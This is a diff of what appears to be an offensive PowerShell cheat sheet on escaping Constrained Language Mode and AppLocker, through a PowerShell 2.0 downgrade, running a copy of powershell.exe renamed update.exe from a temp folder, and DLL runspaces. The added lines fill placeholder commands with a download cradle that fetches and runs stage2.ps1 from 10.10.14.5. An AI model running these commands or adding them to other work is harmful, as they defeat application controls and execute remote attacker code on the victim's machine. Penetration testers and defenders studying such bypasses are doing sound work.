@@ -210,7 +210,7 @@ $ExecutionContext.SessionState.LanguageMode
 
 # ── Bypass 1: PowerShell 2.0 downgrade (if .NET 2.0 is installed) ────────────
 # PS 2.0 predates CLM — it runs in FullLanguage mode regardless of AppLocker policy
-powershell.exe -version 2 -nop -ep bypass -c "..."
+powershell.exe -version 2 -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"
 
 # ── Bypass 2: Find writeable paths that are not covered by AppLocker ──────────
 # AppLocker default rules only cover %WINDIR% and %PROGRAMFILES%
@@ -222,7 +222,7 @@ $writeable = @(
 )
 # Copy powershell.exe to a user-writeable path and run from there:
 Copy-Item $env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe $env:TEMP\update.exe
-& "$env:TEMP\update.exe" -nop -ep bypass -c "..."
+& "$env:TEMP\update.exe" -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/stage2.ps1')"
 
 # ── Bypass 3: PowerShell runspaces in a compiled DLL ─────────────────────────
 # C# code running as a DLL can create a PowerShell runspace in FullLanguage mode
